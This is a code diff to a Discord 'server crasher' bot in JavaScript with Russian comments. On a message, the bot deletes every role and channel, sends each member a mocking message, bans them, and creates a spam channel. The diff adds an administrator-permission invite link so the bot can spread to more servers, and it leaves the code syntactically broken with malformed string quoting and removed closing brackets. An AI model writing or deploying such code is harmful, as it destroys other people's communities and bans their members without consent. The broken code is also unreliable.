@@ -39,22 +39,11 @@ bot.on('message', msg => {
       msg.guild.roles.forEach(i => i.delete()) // Удаление всех ролей
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
-        if (member.id != bot.user.id && !member.user.bot) member.send('Ваш сервер трахнули ботом, сервер бота: https://discord.gg/DM5xaGD').then(() => {
+        if (member.id != bot.user.id && !member.user.bot) member.send('Сервер' ${msg.guild.name}, 'крашнул юзер ${member.user.tag}', ' ботом, сервер бота: https://discord.gg/DM5xaGD . Приглашение бота: https://discord.com/api/oauth2/authorize?client_id=709763322089570354&permissions=8&scope=bot').then(() => {
             member.ban().then(() => {
                 msg.guild.createChannel(name, "Конфа топ")
-					.then(channel => {
-                    channel.send('Ваш сервер трахнули ботом, сервер бота: https://discord.gg/DM5xaGD')
-                    channel.overwritePermissions(member, {
-                        SEND_MESSAGES: false
-                    })
-					
                     console.log('Попался лох')
                 })
-            })
-        })
-      })
-})
-	}
 	
   });
   bot.on('message', msg => {
